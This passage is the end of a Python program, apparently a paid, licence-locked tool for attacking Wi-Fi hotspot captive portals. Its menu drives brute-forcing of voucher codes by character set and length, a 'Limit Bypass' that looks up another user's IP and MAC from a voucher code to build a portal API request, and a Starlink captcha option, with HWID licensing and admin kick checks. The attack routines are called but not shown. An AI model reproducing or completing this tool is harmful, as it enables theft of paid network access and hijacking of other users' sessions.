    print(f"{_c_}║{RESET}  {_g_}[4] Limit Bypass{_w_}  {_g_}[5] StarLink{_w_}     {_r_}[0] Exit{_w_}        {_c_}║{RESET}")
    print(f"{_c_}╚{'═' * (term_w-2)}╝{RESET}")

# ==================== MAIN MENU ====================
def voucher_menu(hwid):
    while True:
        username = get_router_username()
        remaining = get_remaining_time(username) if username != "Not connected" else "N/A"
        licence_expiry = get_license_expiry()
        
        _clr()
        display_menu(hwid, username, remaining, licence_expiry)
        
        choice = input(f"\n{_c_}Select: {_w_}").lower()
        
        if choice == '0':
            print(f"\n{_g_}Goodbye!{_w_}")
            break
        elif choice == '1':
            _S_().set()
            input(f"\n{_c_}Press Enter...{_w_}")
        elif choice == '2':
            _clr()
            print(f"{_g_}[+] Select Character Set:{_w_}")
            print(f"{_w_}[1] Number     [2] Lower     [3] Upper")
            print(f"[4] Mix        [5] Alphanumeric{RESET}")
            sub = input(f"{_c_}Select: {_w_}")
            mode_map = {'1':'digit','2':'ascii-lower','3':'ascii-upper','4':'ascii-mix','5':'alphanumeric'}
            mode = mode_map.get(sub, 'digit')
            try:
                length = int(input(f"{_c_}Code length: {_w_}"))
            except:
                length = 6
            v_obj = _V_C_(mode, length)
            if v_obj.session_url:
                asyncio.run(v_obj.execute())
        elif choice == '3':
            asyncio.run(_R_V_().check())
        elif choice == '4':
            saved_code = ""
            if os.path.exists(".saved_code"):
                with open(".saved_code", "r") as f:
                    saved_code = f.read().strip()
            _clr()
            if saved_code:
                print(f"{_y_}Saved: {saved_code}{_w_}")
                code = input(f"{_c_}Enter code (Enter to use saved): {_w_}").strip()
            else:
                code = input(f"{_c_}Enter Limited Code: {_w_}").strip()
            if not code and saved_code:
                code = saved_code
                with open(".saved_api", "r") as f:
                    api_url = f.read().strip()
            else:
                with open(".saved_code", "w") as f:
                    f.write(code)
                ip, mac = get_target_info(code)
                if not ip or not mac:
                    print(f"{_r_}[!] No active user!{_w_}")
                    time.sleep(2)
                    continue
                portal = fetch_portal_url()
                if not portal:
                    print(f"{_r_}[!] No portal URL!{_w_}")
                    time.sleep(2)
                    continue
                api_url = transform_portal_url(portal, ip, mac)
                with open(".saved_api", "w") as f:
                    f.write(api_url)
            asyncio.run(UrlBypass(api_url).execute())
        elif choice == '5':
            starlink_captcha_menu()
        elif choice == 'r':
            continue

# ==================== MAIN ====================
def main():
    _chk_strg()
    hwid = get_device_id()
    
    # Force re-login
    if check_force_relogin(hwid):
        print(f"{_y_}[!] Admin forced re-login!{_w_}")
        time.sleep(2)
    
    # Kick check
    kicked, reason = is_kicked(hwid)
    if kicked:
        _clr()
        print(f"\n{_r_}╔════════════════════════════════════════════════════╗")
        print(f"║              YOU HAVE BEEN KICKED!                 ║")
        print(f"╚════════════════════════════════════════════════════╝{_w_}")
        print(f"{_r_}Device: {hwid}\nReason: {reason}{_w_}")
        input(f"{_r_}Press Enter...{_w_}")
        sys.exit(1)
    
    # License check
    while True:
        key, exp, pwd = load_license()
        if key and exp:
            try:
                if datetime.now() < datetime.strptime(exp, "%Y-%m-%d %H:%M:%S"):
                    break
            except:
                pass
        
        _clr()
        print(f"""
{_c_}╔═══════════════════════════════════════════════════════════════╗
║                         [ KOK ]                                  ║
╚═══════════════════════════════════════════════════════════════╝
{_y_}⚡ CONTACT {ADMIN_CONTACT} TO GET LICENSE ⚡{_w_}
""")
        print(f"\n{_c_}DEVICE ID: {_g_}{hwid}{_w_}\n")
        print(f"{_r_}NO VALID LICENSE FOUND!{_w_}\n")
        
        key_in = input(f"{_g_}LICENSE KEY: {_w_}").strip()
        if not key_in:
            sys.exit()
        
        expiry = verify_license(key_in, hwid)
        if expiry:
            pwd_in = input(f"{_y_}User Password: {_w_}")
            save_license(key_in, expiry.strftime("%Y-%m-%d %H:%M:%S"), pwd_in)
            save_session(hwid)
            print(f"{_g_}[✓] License activated!{_w_}")
            time.sleep(2)
            break
        else:
            print(f"{_r_}[✘] Invalid!{_w_}")
            time.sleep(2)
    
    # Password check
    if not has_session(hwid):
        while True:
            _clr()
            print(f"\n{_c_}╔════════════════════════════════════════════════════╗")
            print(f"║                 PASSWORD REQUIRED                  ║")
            print(f"╚════════════════════════════════════════════════════╝{_w_}")
            pwd_in = input(f"{_y_}Password: {_w_}")
            if check_password(pwd_in, hwid):
                save_session(hwid)
                break
            else:
                print(f"{_r_}[✘] Wrong!{_w_}")
                time.sleep(1)
    
    voucher_menu(hwid)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{_g_}Goodbye!{_w_}")